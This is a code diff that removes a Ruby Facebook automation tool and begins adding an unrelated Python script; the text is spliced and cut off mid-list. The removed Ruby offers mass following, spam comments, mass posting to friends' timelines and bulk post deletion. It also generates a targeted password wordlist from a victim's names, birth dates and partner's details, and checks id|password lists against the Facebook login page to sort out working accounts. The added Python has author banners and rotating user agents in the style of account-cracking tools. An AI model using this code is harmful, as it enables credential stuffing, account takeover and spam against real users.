-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] Public Id : ")
-  id = gets.chomp!
-  print ("#{$w}[+] Limit : ")
-  limit = gets.to_i
-  tik ("#{$w}[+] Loading....")
-  puts ("#{$w}#{'═'*52}")
-  a = Request("#{id}?fields=friends.limit(#{limit})")
-  if a.key? ('error')
-    puts ("#{$y}[!] User Not Found")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    FollowMenu()
-  elsif !a.key? ('friends')
-    puts ("#{$y}[!] There are no friends on the account")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    FollowMenu()
-  else
-    for i in a['friends']['data']
-      name = i['name']
-      id = i['id']
-      b = Request("POST","#{id}/subscribers?")
-      if b == true
-        s += 1
-        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{name} #{$w}-> #{$y}#{id}")
-      else
-        f += 1
-        puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{name} #{$w}-> #{$y}#{id}")
-      end
-    end
-    puts ("#{$w}#{'═'*52}")
-    puts ("#{$g}[✓] Succes : #{s}")
-    puts ("#{$y}[!] Failed : #{f}")
-    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    FollowMenu()
-  end
-end
-
-def FollowFile()
-  s = 0
-  f = 0
-  system ("clear")
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  print ("#{$w}[+] File Id : ")
-  file = gets.chomp!
-  print ("#{$w}[+] Limit : ")
-  limit = gets.to_i
-  tik ("#{$w}[+] Loading....")
-  puts ("#{$w}#{'═'*52}")
-  if File.file? (file)
-    files = File.readlines(file, chomp: true).uniq
-    for i in files[0...limit]
-      a = Request("#{i}?")
-      next if a.key? ('error')
-      b = Request("POST","#{a['id']}/subscribers?")
-      if b == true
-        s += 1
-        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{a['name']} #{$w}-> #{$y}#{i}")
-      else
-        f += 1
-        puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{a['name']} #{$w}-> #{$y}#{i}")
-      end
-    end
-    puts ("#{$w}#{'═'*52}")
-    puts ("#{$g}[✓] Succes : #{s}")
-    puts ("#{$y}[!] Failed : #{f}")
-    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    FollowMenu()
-  else
-    puts ("#{$y}[!] File Not Found")
-    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-    FollowMenu()
-  end
-end
-
-def SharePost(link)
-  system ("clear")
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  puts ("#{$w}║-> 1. Share To Facebook")
-  puts ("#{$w}║-> 2. Share on a Friend's Timeline")
-  puts ("#{$w}║-> 3. Share on a Page")
-  puts ("#{$w}║-> 4. Share in WhatsApp")
-  puts ("#{$w}║")
-  print ("╚═#{$r}▶#{$w} ")
-  mana = gets.chomp!
-  case mana
-    when '1'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}[!] Use <> For New Line")
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Message : ")
-      body = gets.chomp!
-      body = body.tr("<>","\n")
-      msg = ERB::Util.url_encode(body)
-      req = Request("POST","me/feed?link=#{link}&message=#{msg}")
-      if req.key? ('id')
-        puts ("#{$g}[✓] Succes  : #{req['id']}")
-      else
-        puts ("#{$y}[!] Failed  : nil")
-      end
-    when '2'
-      s = 0
-      f = 0
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}[!] Use <> For New Line")
-      puts ("#{$w}[!] Use @tag to mention users")
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Message : ")
-      body = gets.chomp!
-      print ("#{$w}[+] Limit : ")
-      limit = gets.to_i
-      puts ("#{$w}#{'═'*52}")
-      a = Request("me?fields=friends.limit(#{limit})")
-      if a.key? ('error')
-        puts (a)
-        abort ("#{$r}[!] Error")
-      elsif !a.key? ('friends')
-         puts ("#{$y}[!] Your Account Has No Friends")
-      else
-        for i in a['friends']['data']
-          id = i['id']
-          name = i['name']
-          user = '@['+id+':]'
-          body = body.gsub("@tag",user)
-          body = body.gsub("<>","\n")
-          msg = ERB::Util.url_encode(body)
-          b = Request("POST","#{id}/feed?message=#{msg}&link=#{link}")
-          #puts b
-          if b.key? ('id')
-            s += 1
-            puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{name} #{$w}-> #{$y}#{id}")
-          else
-            f += 1
-            puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{name} #{$w}-> #{$y}#{id}")
-          end
-        end
-        puts ("#{$w}#{'═'*52}")
-        puts ("#{$g}[✓] Succes : #{s}")
-        puts ("#{$y}[!] Failed : #{f}")
-        puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-      end
-    when '3'
-      s = 0
-      f = 0
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}[!] Use <> For New Line")
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Message : ")
-      body = gets.chomp!
-      body = body.tr("<>","\n")
-      print ("#{$w}[+] Limit : ")
-      limit = gets.to_i
-      tik ("#{$w}[+] Loading....")
-      msg = ERB::Util.url_encode(body)   
-      puts ("#{$w}#{'═'*52}")
-      a = Request("me/accounts?fields=name,access_token&limit=#{limit}")
-      if !a.key? ('data')
-        puts (a)
-        abort ("#{$r}[!] Error")
-      elsif a['data'].empty?
-        puts ("#{$y}[!] Your Account Doesn't Have a Page")
-      else
-        for i in a['data']
-          name = i['name']
-          id = i['id']
-          token = i['access_token']
-          b = Request("POST",token=token,"#{id}/feed?link=#{link}&message=#{msg}")
-          if b.key? ('id')
-            s += 1
-            puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{name} #{$w}-> #{$y}#{id}")
-          else
-	    f += 1
-            puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{name} #{$w}-> #{$y}#{id}")
-          end
-        end
-        puts ("#{$w}#{'═'*52}")
-        puts ("#{$g}[✓] Succes : #{s}")
-        puts ("#{$y}[!] Failed : #{f}")
-        puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-      end
-    when '4'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      code = system ("xdg-open --chooser whatsapp://send?text=#{link}")
-      if code
-        puts ("#{$g}[✓] Successfully Opening the WhatsApp Application")
-      else
-        puts ("#{$y}[!] Failed to Open the WhatsApp Application")
-      end
-    else
-      puts ("#{$y}[!] Invalid Input")
-  end
-end
-
-def lain()
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  puts ("#{$w}║-> 1. Write Status")
-  puts ("#{$w}║-> 2  Write Timeline")
-  puts ("#{$w}║-> 3. Create Wordlist")
-  puts ("#{$w}║-> 4. Account Checker")
-  puts ("#{$w}║-> 5. List of Groups")
-  puts ("#{$w}║-> 6. Access Token")
-  puts ("#{$w}║-> 7. Frofil Guard")
-  puts ("#{$w}║-> 8. Download Video")
-  puts ("#{$w}║-> 9. Fanpage")
-  puts ("#{$w}║-> #{$g}0. Back")
-  puts ("#{$w}║")
-  print ("╚═#{$w}▶#{$w} ")
-  mana = gets.chomp!
-  case mana
-    when '1'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}[!] Use <> For New Line")
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Message : ")
-      body = gets.chomp!
-      body = body.tr("<>","\n")
-      msg = ERB::Util.url_encode(body)
-      post = Request("POST","me/feed?message=#{msg}")
-      puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed  : nil") if !post.key? ('id')
-      puts ("#{$w}[#{$g}✓#{$w}] Succes  : #{post['id']}") if post.key? ('id')
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      lain()
-    when '2'
-      meet = true
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}[!] Use <> For New Line")
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Friend Id/Username : ")
-      user = gets.chomp!
-      print ("#{$w}[+] Message : ")
-      body = gets.chomp!
-      body = body.tr("<>","\n")
-      tik ("#{$w}[+] Loading...")
-      msg = ERB::Util.url_encode(body)
-      puts ("#{$w}#{'═'*52}")
-      a = Request("me/friends?fields=name,id,username")
-      if !a.to_s.include? (user)
-        puts ("#{$y}[!] Friends Not Found")
-      else
-        for i in a['data']
-          name = i['name']
-          username = i['username']
-          id = i['id']
-          if user == id or user == username
-            meet = false
-            post = Request("POST","#{id}/feed?message=#{msg}")
-            if post.key? ('id')
-              puts ("#{$w}[#{$g}✓#{$w}] Name   : #{name}")
-              puts ("#{$w}[#{$g}✓#{$w}] FBID   : #{id}")
-              puts ("#{$w}[#{$g}✓#{$w}] User   : #{username}")
-              puts ("#{$w}[#{$g}✓#{$w}] Status : Success")
-            else
-              puts ("#{$w}[#{$y}!#{$w}] Name   : #{name}")
-              puts ("#{$w}[#{$y}!#{$w}] FBId   : #{id}")
-              puts ("#{$w}[#{$y}!#{$w}] User   : #{username}")
-              puts ("#{$w}[#{$y}!#{$w}] Status : Failed")
-            end
-          end
-        end
-      end
-      puts ("#{$y}[!] Friends Not Found") if meet
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      lain()
-    when '3'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] First Name : ")
-      a = gets.chomp!
-      print ("#{$w}[+] Middle Name : ")
-      b = gets.chomp!
-      print ("#{$w}[+] Last Name : ")
-      c = gets.chomp!
-      print ("#{$w}[+] Nick Name : ")
-      d = gets.chomp!
-      print ("#{$w}[+] Date of birth (DDMMYY) : ")
-      e = gets.chomp!
-      f = e[0...2]
-      g = e[2...4]
-      h = e[4...]
-      puts ("#{$w}═"*52)
-      puts ("#{$w}[!] SKIP IF TARGET SINGLES")
-      print ("#{$w}[+] Girlfriend Name : ")
-      i = gets.chomp!
-      print ("#{$w}[+] Girlfriend Nickname : ")
-      j = gets.chomp!
-      print ("#{$w}[+] Date of birth (DDMMYY) : ")
-      k = gets.chomp!
-      l = k[0...2]
-      m = k[2...4]
-      n = k[4...]
-      password = "%s%s\n%s%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s" % [a, c, a, b, b, a, b, c, c, a, c, b, a, a, b, b, c, c, a, d, b, d, c, d, d, d, d, a, d, b, d, c, a, e, a, f, a, g, a, h, b, e, b, f, b, g, b, h, c, e, c, f, c, g, c, h, d, e, d, f, d, g, d, h, e, a, f, a, g, a, h, a, e, b, f, b, g, b, h, b, e, c, f, c, g, c, h, c, e, d, f, d, g, d, h, d, d, d, a, f, g, a, g, h, f, g, f, h, f, f, g, f, g, h, g, g, h, f, h, g, h, h, h, g, f, a, g, h, b, f, g, b, g, h, c, f, g, c, g, h, d, f, g, d, g, h, a, i, a, j, a, k, i, e, i, j, i, k, b, i, b, j, b, k, c, i, c, j, c, k, e, k, j, a, j, b, j, c, j, d, j, j, k, a, k, b, k, c, k, d, k, k, i, l, i, m, i, n, j, l, j, m, j, n, j, k]
-      puts ("#{$w}[+] Creating Files...")
-      save = a + '.txt'
-      File.open(save,'w') do |data|
-        tik("#{$w}[+] Pleace Wait....")
-        data << password
-        100.times{|x_x| data << a + x_x.to_s + "\n"}
-        100.times{|x_x| data << i + x_x.to_s + "\n"}
-        100.times{|x_x| data << d + x_x.to_s + "\n"}
-        100.times{|x_x| data << j + x_x.to_s + "\n"}
-      end
-      puts ("#{$w}[#{$g}✓#{$w}] #{$g}Success "+save)
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      lain()
-    when '4'
-      ok = 0
-      cp = 0
-      die = 0
-      system ('clear')
-      puts ($logo)
-      puts ("#{$g}[ INFO ] SEPERATOR id | password")
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] File : ")
-      file = gets.chomp!
-      if File.file? (file)
-        files = File.readlines(file, chomp: true).uniq
-        puts ("#{$w}[+] Total #{files.length} Account")
-        puts ("#{$w}[+] START...")
-        puts ("#{$w}#{'═'*52}")
-        for i in files
-          sep = i.split('|')
-          email = sep.first
-          pass = sep.last
-          uri = URI("https://mbasic.facebook.com/login.php")
-          req = Net::HTTP::Post.new(uri)
-          req['user-agent'] = $user_agent
-          req.set_form_data({'email'=>email,'pass'=>pass,'login'=>'submit'})
-          log = Net::HTTP.start(uri.host,uri.port,:use_ssl => true) {|http| http.request(req)}
-          res = log['set-cookie']
-          if res.include? ('c_user')
-            ok += 1
-            puts ("#{$g}[OK✓] #{email} | #{pass}")
-          elsif res.include? ('checkpoint')
-            cp += 1
-            puts ("#{$y}[CP+] #{email} | #{pass}")
-          else
-            die += 1
-            puts ("#{$r}[DIE] #{email} | #{pass}")
-          end
-        end
-        puts ("#{$w}#{'═'*52}")
-        puts ("#{$g}[✓] Total OK  : #{ok}")
-        puts ("#{$y}[+] Total CP  : #{cp}")
-        puts ("#{$r}[!] Total DIE : #{die}")
-      else
-        puts ("#{$y}[+] File Not Found")
-      end
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      lain()
-    when '5'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      puts ("#{$w}[+] From #{$name}")
-      puts ("#{$w}[+] START...")
-      puts ("#{$w}#{'═'*52}")
-      a = Request("me/groups?limit=5000")
-      if !a.key? ('data')
-        puts (a)
-        abort ("#{$r}[!] Error")
-      elsif a['data'].empty?
-        puts ("#{$y}[!] There are no groups in your account")
-      else
-        b = a['data'].each{|i|
-          puts ("#{$g}[✓] Group Name : #{i['name']}")
-          puts ("#{$g}[✓] Group Id   : #{i['id']}")
-          puts ("#{$w}#{'═'*52}")
-        }
-        puts ("#{$g}[✓] Total Groups : #{b.length}")
-      end
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      lain()
-    when '6'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      puts ("#{$w}[+] Your Access Token : #{$token}")
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      lain()
-    when '7'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      puts ("║-> #{$w}1. Enable")
-      puts ("║-> #{$w}2. Disable")
-      puts ("║-> #{$g}0. Back")
-      print ("#{$w}╚═#{$r}▶#{$w}")
-      mana = gets.chomp!
-      if mana == '1'
-        Guard()
-      elsif mana == '2'
-        Guard(on = false)
-      else
-        lain()
-      end
-    when '8'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Video Id : ")
-      id = gets.chomp!
-      puts ("#{$w}[+] Loading...")
-     # puts ("#{$w}#{'═'*52}")
-      a = Request("v10.0/#{id}?fields=source,length,from")
-      save = "Facebook-#{id}.mp4"
-      if a.key? ('source')
-        uri = URI(a['source'])
-        Net::HTTP.start(uri.hostname,uri.port,:use_ssl => true) do |http|
-          puts ("#{$w}[+] Downloading Video From #{a['from']['name']}")
-          File.open(save, "wb") {|f|
-            http.get(uri) do |str|
-              f.write(str)
-            end
-          }
-        end
-        size = File.size(save)
-        durasi = Time.at(a['length']).utc.strftime("%H:%M:%S")
-        puts ("#{$w}[#{$g}✓#{$w}] Download Complete")
-        puts ("#{$w}[#{$g}✓#{$w}] File Name : #{File.basename(save)}")
-        puts ("#{$w}[#{$g}✓#{$w}] File Size : #{size}")
-        puts ("#{$w}[#{$g}✓#{$w}] File Path : #{File.realpath(save)}")
-        puts ("#{$w}[#{$g}✓#{$w}] Duration  : #{durasi}")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        lain()
-      else
-        puts ("#{$y}[!] Invalid Video Id ")
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        lain()
-      end
-    when '9'
-      PageMenu()
-    when '0'
-      menu()
-    else
-      puts ("#{$y}[!] Invalid Input")
-      sleep(0.9)
-      lain()
-  end
-end
-
-def Guard(on = true)
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % [on, $id]
-  headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': 'OAuth '+$token}
-  uri = URI('https://graph.facebook.com/graphql')
-  https = Net::HTTP.new(uri.host,uri.port)
-  https.use_ssl = true
-  req = Net::HTTP::Post.new(uri.path, headers)
-  req.body = data
-  res = https.request(req)
-  body = res.body
-  puts (body)
-  if body.include? ('"is_shielded":true')
-    puts ("#{$g}[✓] Activated")
-  elsif body.include? ('"is_shielded":false')
-    puts ("#{$y}[+] Deactivated")
-  else
-    puts ("#{$r}[!] Error")
-  end
-  print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-  lain()
-end
-
-def PageMenu()
-  system ('clear')
-  puts ($logo)
-  puts ("#{$w}#{'═'*52}")
-  puts ("#{$w}║-> 1. Publish a Post")
-  puts ("#{$w}║-> 2. Publish a Link")
-  puts ("#{$w}║-> 3. Comment Post")
-  puts ("#{$w}║-> 4. Spam Comments")
-  puts ("#{$w}║-> 5. Delete Post")
-  puts ("#{$w}║-> 6. Access Token")
-  puts ("#{$w}║-> #{$g}0. Back")
-  puts ("#{$w}║")
-  print ("#{$w}╚═#{$r}▶#{$w}")
-  mana = gets.chomp!
-  case mana
-    when '1'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}[!] Use <> For New Line")
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Your Page Id : ")
-      id = gets.chomp! ; id = id.tr(" ","")
-      print ("#{$w}[+] Message : ")
-      body = gets.chomp!
-      body = body.tr("<>","\n")
-      req = Request("me/accounts?fields=name,access_token")
-      token = req['data'].map {|i| i['access_token'] if i['id'] == id}
-      uri = URI("https://graph.facebook.com/#{id}/feed")
-      data = {"message"=>body,"access_token"=>token[0]}
-      req = Net::HTTP.post_form(uri,data)
-      post = JSON.parse(req.body)
-      puts ("#{$w}[#{$g}✓#{$w}] Success : #{post['id']}") if post.key? ('id')
-      puts ("#{$w}[#{$y}!#{$w}] Failed  : nil") if !post.key? ('id')
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      PageMenu()
-    when '2'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}[!] Use <> For New Line")
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Your Page Id : ")
-      id = gets.chomp! ; id = id.tr(" ","")
-      print ("#{$w}[+] Message : ")
-      body = gets.chomp!
-      print ("#{$w}[+] Link : ")
-      link = gets.chomp!
-      body = body.tr("<>","\n")
-      req = Request("me/accounts?fields=name,access_token")
-      token = req['data'].map {|i| i['access_token'] if i['id'] == id}
-      uri = URI("https://graph.facebook.com/#{id}/feed")
-      data = {"message"=>body,"access_token"=>token[0],"link"=>link}
-      req = Net::HTTP.post_form(uri,data)
-      post = JSON.parse(req.body)
-      puts ("#{$w}[#{$g}✓#{$w}] Success : #{post['id']}") if post.key? ('id')
-      puts ("#{$w}[#{$y}!#{$w}] Failed  : nil") if !post.key? ('id')
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      PageMenu()
-    when '3'
-      s = 0
-      f = 0
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}[!] Target Must Be Page")
-      puts ("#{$w}[!] Use <> For New Line")
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Your Page Id : ")
-      id = gets.chomp! ; id = id.tr(" ","")
-      print ("#{$w}[+] Target Id : ")
-      target = gets.chomp!
-      print ("#{$w}[+] Message : ")
-      body = gets.chomp!
-      msg = body.tr("<>","\n")
-      req = Request("me/accounts?fields=name,access_token")
-      token = req['data'].map {|i| i['access_token'] if i['id'] == id}[0].to_s
-      puts ("#{$w}[!] CTRL + C TO STOP")
-      puts ("#{$w}#{'═'*52}")
-      if token.match? ('EAA')
-        uri = URI("https://graph.facebook.com/v1.0/#{target}?fields=feed.limit=5000&access_token=#{token}")
-        r = Net::HTTP.get(uri)
-        a = JSON.parse(r)
-        if a.key? ('error')
-          puts a
-          puts ("#{$y}[!] Target Not Found")
-        elsif a['feed']['data'].empty?
-          puts ("#{$y}[+] No Posts")
-        else
-          for i in a['feed']['data']
-            begin
-              uri = URI("https://graph.facebook.com/#{i['id']}/comments")
-              data = {"message"=>msg,"access_token"=>token}
-              post = Net::HTTP.post_form(uri,data).body
-              res = JSON.parse(post)
-              if res.key? ('id')
-                s += 1
-                puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes -> #{i['id']}")
-              else
-                f += 1
-                puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed -> #{i['id']}")
-              end
-            rescue Interrupt
-              puts ("\n")
-              break
-            end
-          end
-          puts ("#{$w}#{'═'*52}")
-          puts ("#{$g}[✓] Succes : #{s}")
-          puts ("#{$y}[!] Failed : #{f}")
-          puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-        end
-      else
-        puts ("#{$y}[!] Your Account Does Not Have A Page With Id #{id}")
-      end
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      PageMenu()
-    when '4'
-      s = 0
-      f = 0
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}[!] Use <> For New Line")
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Your Page Id : ")
-      id = gets.chomp!
-      print ("#{$w}[+] Page Post Id : ")
-      posts = gets.chomp!
-      print ("#{$w}[+] Message : ")
-      body = gets.chomp!
-      body = body.tr("<>","\n")
-      puts ("#{$w}[!] CTRL + C TO STOP")
-      puts ("#{$w}#{'═'*52}")
-      req = Request("me/accounts?fields=name,access_token")
-      token = req['data'].map {|i| i['access_token'] if i['id'] == id}[0].to_s
-      if token.match? ('EAA')
-        a = Net::HTTP.get(URI("https://graph.facebook.com/#{posts}?fields=from&access_token=#{token}"))
-        b = JSON.parse(a)
-        if b.key? ('from')
-          loop do
-            begin
-              uri = URI("https://graph.facebook.com/#{posts}/comments")
-              data = {"message"=>body,"access_token"=>token}
-              req = Net::HTTP.post_form(uri,data)
-              res = JSON.parse(req.body)
-              if res.key? ('id')
-                s += 1
-                puts ("#{$w}[#{$g}✓#{$w}] #{$g}Success -> #{posts}")
-              else
-                f += 1
-                puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed -> #{posts}")
-              end
-            rescue Interrupt
-              break
-            end
-          end
-          puts ("\n#{$w}#{'═'*52}")
-          puts ("#{$g}[✓] Succes : #{s}")
-          puts ("#{$y}[!] Failed : #{f}")
-          puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-        else
-          puts (b)
-          puts ("#{$y}[!] Post Not Found")
-        end
-      else
-        puts ("#{$y}[!] Your Account Does Not Have A Page With Id #{id}")
-      end
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      PageMenu()
-    when '5'
-      s = 0
-      f = 0
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      print ("#{$w}[+] Your Page Id : ")
-      id = gets.chomp!
-      req = Request("me/accounts?fields=name,access_token")
-      token = req['data'].map {|i| i['access_token'] if i['id'] == id}[0].to_s
-      if token.match? ('EAA')
-        puts ("#{$w}[+] Page Name : #{req['data'][0]['name']}")
-        puts ("#{$w}[!] CTRL + C TO STOP")
-        puts ("#{$w}#{'═'*52}")
-        a = Net::HTTP.get(URI("https://graph.facebook.com/#{id}?fields=feed.limit(5000)&access_token=#{token}"))
-        b = JSON.parse(a)
-        if b.key? ('error')
-          puts (b)
-          abort ("#{$r}[!] Error#{$a}")
-        elsif !b.key? ('feed')
-          puts ("#{$y}[!] No Posts")
-        else
-          for i in b['feed']['data']
-            begin
-              posts = i['id']
-              uri = URI("https://graph.facebook.com/#{posts}?method=DELETE&access_token=#{token}")
-              del = Net::HTTP.get(uri)
-              if del.include? ('true')
-                s += 1
-                puts ("#{$w}[#{$g}✓#{$w}] #{$g}Success -> #{posts}")
-              else
-                f += 1
-                puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed -> #{posts}")
-              end
-            rescue Interrupt
-              puts ("\n") ; break
-            end
-          end
-          puts ("#{$w}#{'═'*52}")
-          puts ("#{$g}[✓] Succes : #{s}")
-          puts ("#{$y}[!] Failed : #{f}")
-          puts ("#{$w}[+] Total  : #{s + f}#{$a}")
-        end
-      else
-        puts ("#{$y}[!] Your Account Does Not Have A Page With Id #{id}")
-      end
-      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-      PageMenu()
-    when '6'
-      system ('clear')
-      puts ($logo)
-      puts ("#{$w}#{'═'*52}")
-      puts ("#{$w}[+] From #{$name}")
-      puts ("#{$w}[!] START...")
-      puts ("#{$w}#{'═'*52}")
-      req = Request("me/accounts?fields=name,access_token")
-      if req.key? ('error')
-        abort ("#{req}\n#{$r}[!] Error")
-      elsif req['data'].empty?
-        puts ("#{$y}[!] Your Account Does Not Have a Fan Page")
-      else
-        for i in req['data']
-          puts ("#{$w}[#{$g}✓#{$w}] Page Name : #{i['name']}")
-          puts ("#{$w}[#{$g}✓#{$w}] Page Id : #{i['id']}")
-          puts ("#{$w}[#{$g}✓#{$w}] Access Token : #{i['access_token']}\n\n")
-        end
-        print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
-        PageMenu()
-      end
-    when '0'
-      lain()
-    else
-      puts ("#{$y}[!] Invalid Input")
-      sleep(0.9)
-      PageMenu()
-  end
-end
+## logo 
+logo="""\033[1;37m
+ d8888b. d888888b  .d8b.  d88888D 
+ 88  `8D   `88'   d8' `8b YP  d8' 
+ 88oobY'    88    88ooo88    d8'  
+ 88`8b      88    88~~~88   d8'   
+ 88 `88.   .88.   88   88  d8' db 
+ 88   YD Y888888P YP   YP d88888P 
   
 
-if __FILE__ == $0
-  system("printf \"\033]0;Facebook\007\"")
-  Masuk()
-end
+ [*]=============================================
+    Author   : RIAZKHAN
+    Facebook : https://facebook.com/riazkhan
+    Team     : anees+ali+riaz
+    Connect  : 03188214452
+ [*]=============================================
+   \033[1;31m  Use (Flight) Airplane Mod For Speed Up \033[1;37m
+ [*]============================================="""
+wwn = pilih([U, C, B, Q])
+
+loag="""\033[1;37m
+ d8888b. d888888b  .d8b.  d88888D 
+ 88  `8D   `88'   d8' `8b YP  d8' 
+ 88oobY'    88    88ooo88    d8'  
+ 88`8b      88    88~~~88   d8'   
+ 88 `88.   .88.   88   88  d8' db 
+ 88   YD Y888888P YP   YP d88888P 
+
+[*]=============================================
+    Author   : RIAZKHAN
+    Facebook : https://facebook.com/RIAZKHAN
+    Team     : anees+ali+riaz
+    Connect  : 03188214452
+[*]=============================================
+   \033[1;31m  Use (Flight) Airplane Mod For Speed Up \033[1;37m
+[*]============================================="""
+try:ua = open(".ua","r").read()
+except:
+	ua = pilih([
+	"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
+#	"NokiaX2-00/5.0 (04.80) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
+	])
+	ua1 = random.choice(['NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+',
+		'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
+		'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11',
